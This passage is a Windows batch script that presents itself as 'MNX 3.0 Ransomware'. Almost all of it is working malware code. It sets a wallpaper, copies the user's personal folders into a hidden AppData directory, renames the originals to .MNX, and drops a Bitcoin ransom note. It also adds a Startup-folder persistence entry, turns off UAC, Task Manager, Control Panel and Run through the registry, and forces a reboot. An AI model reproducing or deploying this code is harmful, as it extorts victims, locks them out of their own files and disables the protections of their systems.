echo 3uaGkeZOo7SU0ApXV9pG+wzNtMhMrfq3CpIa9u0VzzAerWlCtWnj1Wf9bjymQ507>>Background
echo ZfVOrw0tlKUs1idFeZtGtfvSxR+jLd0uhhfUOxyIYkivh9mhfKSX1L9+XNblYWjj>>Background
echo 2CK8T3EWnHW62SkSJ1U86Kzyc3DyYlquTsrrEwPl0l/UR5danicyXE2vU9bmqaeL>>Background
echo bb7XGetJMqlbxS8VewBUAy332OxShgaPl3vSXiuZj6B8bV8FbiyZrWw/MqsxZLNF>>Background
echo +1yfjxfXspbxrub6ckc9G3KL1pQG9z+6a88UpS6zIjO11W+HprR/ELXGwySh9tTK>>Background
echo tr5o7W4Hzztn0gNatGlSa2hRF8f1qi86O6qzouKh28Xwknr7A+Em6SeH0qp/pJci>>Background
echo 47l0wdjGoUV4p3TO2cfldTXhp0hMvHQ6+V9MDX074SxadOLMT/VdzhK08iPVvlS3>>Background
echo 9TO6RzJ4kmGh8nPV/lLr/N7FS4Djm6s5A9x6LiVTuvFd4Djfy5//vf2jVF6AmuE7>>Background
echo qAL1eLbnKjwzK58n8yiVplmHjYV61jbZLyH7p7Xr8O0KVzbrZyW9zIrM1KrfR6jv>>Background
echo +ig6SccjBnSfMMqOvWr6YzqpMw9sVh3UvLI4rld9Vm3Uruq8mvKOT9d/6aZ6y+ru>>Background
echo QBST9JNDaVse6aXSuIdYN7ZxaBHeKZ1zh4X9EGF4ONg5Eee2nXB6LAGnifOv0vnq>>Background
echo f7jLeLy+pJJankeTPDYD1Orj/U6jz6uONx0zqdv3M0Dftr2f/GkvKTzYlMumnGvF>>Background
echo EFaCtqPDDNDLLH0RplmHjYUqKiNLaUpDtaY0uBYeA9t/ZX1aZKbO+idD2z34ljha>>Background
echo k4RZf21HKE0tx3RSZx7Y2tCiLo7rW6YI4l5UPM5mgC+pd/a2+fxITQ7ldOeTd82h>>Background
echo ZKpty8e+RXindC5Mh9XqoPAR54z/IZ/+SFCebCknBuWEyrMsl8o2xbo4C+XRDP4u>>Background
echo 8Dx9Oa897tnYKJNVS9qarjb5lCMCoBaXh8nnAH1s7DXb1Wr/q5/jLMbfMGsZZoBe>>Background
echo plrU+mGSddxYtOapYk+U+9YKr2tkWmRuy+XJ0E57/xFzq3ySMPPP8nXHdFJnHti+>>Background
echo WVInfpP15cPq2vWo7mQ/DBXz5b4vwy31ekU6EJPoOe2b2aF8rJdUsv1Oe7wuOGlj>>Background
echo 3yK8UzonxuFx3i5Pe51OJfzo5DmvysnX5MmWVIb/4S5B6/pSiXXhiQxX05fFk61Q>>Background
echo gxYxCodzXQnKGIqWaeNyMw4jb/bDQZek934FXIdVjr9+3D0zA5xmnTTXaE+iearY>>Background
echo C8t9a4X3k9hpkZk6l9Xu8UgZHa3NLo7WJGGWPXST6Y7ppM5p1aEuTtZrp1VyhDpV>>Background
echo d7HfNF+c/cMq8xngC+qdRc9p38wOZd0y6SUlXOZnB2Zt7FuEd0rn3DA8ynDR6VT+>>Background
echo Lu51XpXrrE6ebCmHWHl8aik8kWTcVKkdR58daNBtY3RkzHOZvrwGKDaLnQwju5A6>>Background
echo 3quoi182aaJRZgY+nKQbd91sMLequjpXmGXVGJtOJFrPqr+8MK3xwdYKzzUyKzK3>>Background
echo ZW9PesSVdUphAzwzlpUqr+Sf5WvHdFrntOpQFyfr7TYV27wTT50muraLzc31avMY>>Background
echo PafpLeVwKNuWyd6qa1RUzvjGNj5yduNd0TnXnzA6j2wg6yEmNNo+nvRST8OQ059y>>Background
echo /j61FJ5IcjW9aNkHxUrtycrHGVv5S54zQGvkdBKisg9adVqe/I1DPSnjIQLIpLx8>>Background
echo ngGoziPMNGs2u6MWR8+qKV6Y1pQJVC1ca+p7ltMiM3X29pUAqE3d0cqGRsLMP8+n>>Background
echo LdG5kzr18IJ3gVVy94arqunffp3GMHNzvbPM077pD2XZOW251kula5Tay5+0sW8R>>Background
echo 3imdAv0Jo0U7IeqJZmfQ7E95nmx65tMe+0Nqj+Wv/lNLz2eYpK/sjPcnXYO7k702>>Background
echo uAZA2zoWYWVbwFBRZT6hFH72a4WVM8xaynO7K2EGIKWKPpFJ1nFj0RqqxF5CDuOo>>Background
echo SIUrm3fI3f4wK7Ib9J5b23196ULXjpaty4ZGwkw/OcKihBFgJnVmCVl1iGqm6/UX>>Background
echo 4XhY7OKrF60HdgpibRc7N9RbVk8P/jT9cChLiyY7n6Jrog+6NtZck5rwzkyGR7xw>>Background
echo pNMox/Np8kdT8mSzE8rP6IM/aHLmRT2yZMXckGHcVKnOssLfMQ1tpqChGU9Ky8x8>>Background
echo ElLeTFTZZedUpj/J9xj7DP7cL48yAA0zwGnWYWNRe1b1leGrNWUCVQvXphJS1rtZ>>Background
echo kZk6ezuGdnahGY/WJFJGvvpFtc4p10zqjBK0Nhpa1HbXJ4UqcuUbMDkHLy+qtf7r>>Background
echo PFOvHkr5syM3SV+f1UM53fkUGfXgJY5tlHZ227cG8f7UYVpoUefRw1Zn9aWsv5TZ>>Background
echo Uk+jvZxANgLsif4eK3G5gbAt2du0bals87+0N2QYczf+ZQk5d1t0/nuxq23M6brX>>Background
echo AO2sn/51L3f41E7GuV4+SKaxoxq9UTWDZjD29qGt1+DxXIo8be41yTrZ6LJn7Qta>>Background
echo ZZvWeMVd4eoQK3xtFU+KzNSToZ1daLqj9bCfJowCLH0psGnHdNYDy4N946xVYerE>>Background
echo L5sU7F6v2612xnOrENuLRSmq7WLn+Xq9ov5AhEnfzA9lHqXc+ZB9opbb6rGNUluk>>Background
echo LVYD3hedF7JtY1fnkWxsiMb5sI4/sck/dSHbbfnapqfa6aJlW++oqkL6Jd9WSrsl>>Background
echo w5i7Kt//lWMXaVY63/1z3HFDaBvteXv8LktVPkDTPh94UJzPIWPfSG1doYhWxo4V>>Background
echo aV/s96/DRTWmz2r3yF4ehy/ve7ajfyd2ufWrRItTSmQl1MKtGG2Pve2LrKlL/Svb>>Background
echo 0+Vxfd+6ULqjdbyfJvSju9luVcNxkwO+6I5pX2dpjVqmFe0PiYU5+9JtexKUynfs>>Background
echo HBM22yslKb3Q7WJzW73jgQhjehkPpTZNdt756s0uDp5yDG2U2iJL2Q4u3olyS4z+>>Background
echo Bhqr9eZgp9aDrgguOgvL5+x7JYvYwiH/bD6sdRVXXTb9Ur/tlgxj7rCroam/CrPg>>Background
echo s1mf66mb7SrGl6CkrFi1wdVuYNJuD1KcoxG+VmXmY9VlnW/MnjWxpk+Uhcvq0D2/>>Background
echo UmQpqM9du1Ab69G6ltD6RofRPvXhi2Z2TPs6rWGbg/KelSfWdAXWJ07ztAhwDzlh>>Background
echo s6Kybd0umpvrXUwPRBjT56HMG+9f2XmTi/kotY1ji/S3ZPbnEu+c/TDHlVu99bqX>>Background
echo 3G7z4gyY+q4uvOGY3miVL6jpcvf5Al+v3tcyadFq9lI33ru1rp2mL8YMVtsX/tXc>>Background
echo vzQDpr6zC589prd70JX35vKgy8sbCnzFel/Jr9ci/GrOz3xNqLu0uk29jsW3+t4u>>Background
echo fO6YvoTdD3WzmbxI/IjXrPd1/HotAgAAAAAAAAAAAAAAAAAAwP+Ach+G/AKmfcX/>>Background
echo 1T6Wf7bbI0y/S/qstd25oP/6arV6UIHf+DWu1eHb8wL471p33z+3m12dhrtwfoez>>Background
echo 3VjpxWUtFrMAGF+139uWG4JYfjO/t7ox7/OulT51S5qf5pduHPCjXVpkWOuZotbV>>Background
echo +de3mNy47kZq0NiCXQbo3U1BrCYf3Jb3eddLH92S5qf5pRsH/GiKeBEZ/Ma+Cj+v>>Background
echo NAP0ADjeNOsmsxBcbxyY99V82uR3iMMs76XcQfmlrpc+uiXNT/NLNw740doMUDFC>>Background
echo l0eLdh+37zX5UYsbzWaApxyyt83iavLBNK929psi/fXSR7ek+Wl+6cYBP5omXP5b>>Background
echo XR55brulyK2+bQY4DYDn+r7MTTPAlnwwzata5j+z8rxHSh/ckuan+aUbB/xwOQNc>>Background
echo 7RQKL919fNs9ge2Jz5ZWh+5mw2k3iSPthsTtNcAho99V+P6u1DTeYth+E2e8BN5r>>Background
echo 8RT3ES6zuNWipZ/eoHhIrtG+rtWWvPFT3OY0jQT7xc7KK8X1Bbf2Plp6l3lMIy/r>>Background
echo xqEVqTTA9XlXOz1TK6y79lpd1u4W64XlmFzhe/lj4/qdvFov8J+nIWEBcH/a2udh>>Background
echo tt0rY+UjMpoe2hNLs15u7TdzLMXKfjJC67Q4TvM009ostiWE1Rlgl9GybHb7fO/5>>Background
echo sjxe1nmlbLOy5aYmNDv/PY/t1u96rLLX9kmdmmDIbYbkK21dqCJPbHn9tylsR+a8>>Background
echo 2JP9LJDPgvuCW3sfK73PPKRxL+jGSStC36V9XvsdpIv/zsZB68Ui+spqOS23elAT>>Background
echo JuWPjWs7eb1e4B3IGaA/m0wANIp82O09FJTflFuVdTsNOc+nsVPHug9W21p+PE7Z>>Background
echo fdOYsdzCfeXrLv47cuXHxqz+jU1Do9LUfp5Wszgf7z62ZcidanKNZ1sfm5VXDbZP>>Background
echo wzwyxJX8dNwoqGiv+oKjvftS7COl95m7BocXdONQUNF36ZDX9mnr8XC5OfqDlWDp>>Background
echo bXOZ8s4OU2vc0HtX6gXeAw2cOOkVgCbBoQwibbHZmhZ8c7y1oUV/7VCju5sBlp8m>>Background
echo U5mWNDa1jDbW8qc2rUx/3zkf9G9UU4Z3aj9Pa0NbM1Sb+liKIXdVk8fuxIPltfBe>>Background
echo f0JjRqVu1DqlHgru2/to6V3mLk16STf2BRVdl07y2j7pUW2w37NTJr+KztpKifPy>>Background
echo o3GT3pvXC7wHGj4RACNs9WKudbJ4o9HhoUMZbFGjL8aZD8ZCRViU0WizkmLTmDGX>>Background
echo 7jQTUXKPdR6VIq8NRV8Z7ocZoOeNhna57aFoybXZGqh2WrGZV9X3pXdKvWf9PxRc>>Background
echo 22tx5FrpGT8ic9/gdFM3ltVdQYUqql06yRuhTkuWIlbWEsueTg7TsAOePP4izOoF>>Background
echo 3oUYyaIRNA2AZdW5DN+YO8WYHycaIUbopfzEbmwaM6rI+pvBOer9Uf/48MvH1CZU>>Background
echo OZijoV3u1oIu+YMnVjstsfJ6K67sZGhzw6Fga68HZvdI6V3mPk16QTf2BbnapVo/>>Background
echo yRsPOoI29VMl3m9ZYql0Xn40rttJe5zVC7wLGic+QnwgtZEefMJQfrYmh0gMqYxG>>Background
echo OZDcsDAdW5FRa3W5lbHuZD/o47OzzFtmLk2bUOVgbpOilrsa5l97/wH5CDQ+8rPZ>>Background
echo M93EbSy4a+/V0q0pw6xvSFP4qme6MWdok+iZ3WImefVguxaRL6d0WWL5yzY9TLVx>>Background
echo 405embYC70EZJ6ZMGUaKRudVGXU5+mJIdSOrzb90IdVNxmLTJKP/kKNCitbpycV+>>Background
echo hXthH0/JvPMAmCEhC4iGZu7zov0ke59cUy4FrogSyusjPGKHotf0E98t46RgVRft>>Background
echo fbT0fv3wPNzejbNAlN1i5nm7ABgPtcTSS/Pyo3FD33frgXdF48RHSJ1YDfbaWi72>>Background
echo NEcoL7W16UeOLB+UbliIpWlGUezwK9L+9UMlK3knAbCbm2QBZWgPuasueSlIEcD2>>Background
echo Snl9hGdA0GPfVGkZZwVne6+WHgGwxq0uTXVzN2rzJBB1XXolr+1aTP1yBpglqpe0>>Background
echo dV5+NG7cyWuNBt6Bp2eANnBiAOaIiTGvh/m7wFroPhYdm8aMD/7cPnnmL+q35FnQ>>Background
echo JAB2cxMV4E1Vk60FQ+6qJo/woIdorq+PRdvZSe5Wz1DwgzeqtPfR0rvM4/N0czfO>>Background
echo MvddOs9rD9oV67B4sLXeS2UvHi1/0nvXGg3892ncPBUANcLbiPHRFwNNG2Jq0c0k>>Background
echo tM3Cgr08pn9i05hxXepYWcpW425lyXwAa6j6Y4i5yYP+zyqjliF3aslVjlUbUUJ5>>Background
echo ffaU8yTNycpsKnVzoLFZXXuvlm5NGSZQrcHNDd1YVvcFudhZ79J5Xmtc7FKs7Eq0>>Background
echo HWxLfizaDgw7eaVe4F1oM8CYWE2cyrCqw80GVgx9y6e13QxQYaKEw7VlilnHmHFd>>Background
echo XsZSSk1A8kUte30shupel8JRY+FzE79+zLlNNrTPXdXk8eKZgoYlVt5YzMSTlwBL>>Background
echo xqIvONqrgGkTpkdK7zO3NL1nujGbNxTk+i6d57XFiHwZ2qOoCHBXy/fGjb3X1Wvf>>Background
echo RwTeCQ2UGKt6VuYag0udKJXYoaHk40wRYXnw7x+UWUmhgGClrX06kbOaIWN8sPjB>>Background
echo 5ydaZykXvqUkVwmlgmSv1q99VYTIOnkZcqeaXMUp9YOuXbcXix0by6RWX9lHoy11>>Background
echo DtQXHO0t35u4WvrDbsisSVY2uPN8N3qY6wsKfZeOedUftjMRAOPB1m6X9UsdrXw/>>Background
echo Fl3jht7r6tV6D4nAf99BA0Jjb62BYB+IOM6/DR+XgOagUKLh6MPMlsxBK7Y+1Apb>>Background
echo u/WPAfo7B0ff1Gc8HLcakevl0SckGrVKHkFJQWWz3aqEY/9NfktSQoA9Oe331tDy>>Background
echo puyQO9TkCgSysSGvAX053l+Wm4djCQtz/omWbZbUFTxv77z0eeZZNbd1o311txUU>>Background
echo WpeOeT3n5t67pXwb+Lgu4fFw97A5xAx3KH9oXLeTfb1WEAEQ74TfqsTHSnuWLhoS>>Background
echo +zpzkf72IRppGx9l58WifzV9ddj49e9QYJdxdX+3tzualCVNovQ8x9vCn9snM2KF>>Background
echo O0eBWV4+mj53yOR3q/XmYM8eLIW9JLcqDb5qtbNCW1G14El7r5Zeb/hS1DTFzd24>>Background
echo mBYUWpcOeUvi8pBt0OqcJ6e+fF9sjWs76ZlLvco/uQoH3qWTTSymUxm81A/uRp8B>>Background
echo fo9V//cMeLd03beZviKFF/ux3bg46VJ4OisG8HLn8u0tfJ8f2o1r+37b9G6oAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPBfdHf3/2kD>>Background
echo N8tXioXHAAAAAElFTkSuQmCC>>Background

:Base64Decoding
Certutil -decode Background Background.png>nul
del Background
cls

:ChangeBackgroundBatch
echo @echo off>ChangeBackground.bat
echo reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d "%appdata%\MNX\Background.png" /f>>ChangeBackground.bat
echo reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 6 /f>>ChangeBackground.bat

:ChangeBackgroundVBS
echo Set objShell = CreateObject("Shell.Application") >Changebackground.vbs
echo objShell.ShellExecute "%appdata%\MNX\changeBackground.bat", "/c lodctr.exe /r", "", "runas", 0 >>Changebackground.vbs
start Changebackground.vbs

:Encrypt
cd %appdata%\MNX
echo @echo off >Encrypt.bat
echo xcopy %userprofile%\Desktop %appdata%\MNX\Desktop /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Downloads %appdata%\MNX\Downloads /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Videos %appdata%\MNX\Videos /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Documents %appdata%\MNX\Documents /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Music %appdata%\MNX\Music /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Pictures %appdata%\MNX\Pictures /e /h /y >>Encrypt.bat
echo cls >>Encrypt.bat
echo. >>Encrypt.bat
echo cd %userprofile%\desktop>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Downloads>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Videos>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Documents>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Music>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Pictures>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cls >>Encrypt.bat
echo move %appdata%\MNX\Readme\Readme.txt %userprofile%\desktop>>Encrypt.bat

:EncryptVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Encrypt.vbs
echo objShell.ShellExecute "%appdata%\MNX\Encrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Encrypt.vbs


:Decrypt
cd %appdata%\MNX
echo xcopy %appdata%\MNX\Desktop %userprofile%\Desktop /e /h /y >Decrypt.bat
echo xcopy %appdata%\MNX\Downloads %userprofile%\Downloads /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Video %userprofile%\Video /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Documents %userprofile%\Documents /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Music %userprofile%\Music /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Pictures %userprofile%\Pictures /e /h /y>>Decrypt.bat

echo cd %userprofile%\Desktop>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo del Readme.txt>>Decrypt.bat

echo del x>>Decrypt.bat
echo del x.js>>Decrypt.bat
echo del z.zip>>Decrypt.bat

echo cd %userprofile%\Downloads>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Videos>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Documents>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Music>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Pictures>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat

echo cd %appdata%\MNX>>Decrypt.bat
echo start Regedit.vbs>>Decrypt.bat
echo exit >>Decrypt.bat

:DecryptVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Decrypt.vbs
echo objShell.ShellExecute "%appdata%\MNX\Decrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Decrypt.vbs

:Readme
cd %appdata%\MNX\Readme
echo WHAT'S UP?>Readme.txt
echo All your files are encrypted by MNX 3.0 Ransomware.>>Readme.txt
echo The Decryption Key is generate with a random number.>>Readme.txt
echo Pay 1,000,000 WON worth of Bitcoin, and you'll get your own key.>>Readme.txt
echo If you closed the tab: restart your computer.>>Readme.txt

:MNX
set aa=%random%
cd %appdata%\MNX
echo %aa%>key.txt
cls

echo @echo off>MNX.bat
echo :a>>MNX.bat
echo color 0a>>MNX.bat
echo echo WHAT'S UP?>>MNX.bat
echo echo All your files are encrypted by MNX 3.0 Ransomware.>>MNX.bat
echo echo The Decryption Key is generate with a random number.>>MNX.bat
echo echo Pay 1,000,000 WON worth of Bitcoin, and you'll get your own key.>>MNX.bat
echo.>>MNX.bat
echo set bb=%aa%>>MNX.bat
echo set /p key=Decryption Key: >>MNX.bat
echo if %%key%%==%%bb%% goto b>>MNX.bat
echo.>>MNX.bat
echo cls>>MNX.bat
echo goto a>>MNX.bat
echo.>>MNX.bat
echo :b>>MNX.bat
echo cls>>MNX.bat
echo echo Wright Decryption Key...>>MNX.bat
echo echo Click Any Keys to Decrypt the files>>MNX.bat
echo cd %appdata%\MNX>>MNX.bat
echo start Decrypt.vbs>>MNX.bat
xcopy /h /y %appdata%\MNX\MNX.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"

:Regedit
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t "REG_DWORD" /d "1" /f
cls

:RecoverRegedit
echo @echo off>Regedit.bat
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "1" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /f>>Regedit.bat
echo cd %appdata%>>Regedit.bat
echo del Background.png>>Regedit.bat
echo del "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\MNX.bat">>Regedit.bat
echo Rmdir /s /q MNX>>Regedit.bat
echo exit>>Regedit.bat

:RegeditVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Regedit.vbs
echo objShell.ShellExecute "%appdata%\MNX\Regedit.bat", "/c lodctr.exe /r", "", "runas", 0 >>Regedit.vbs

:Run
attrib +S +H %appdata%\MNX /D
start Encrypt.vbs
shutdown -r -t 1
exit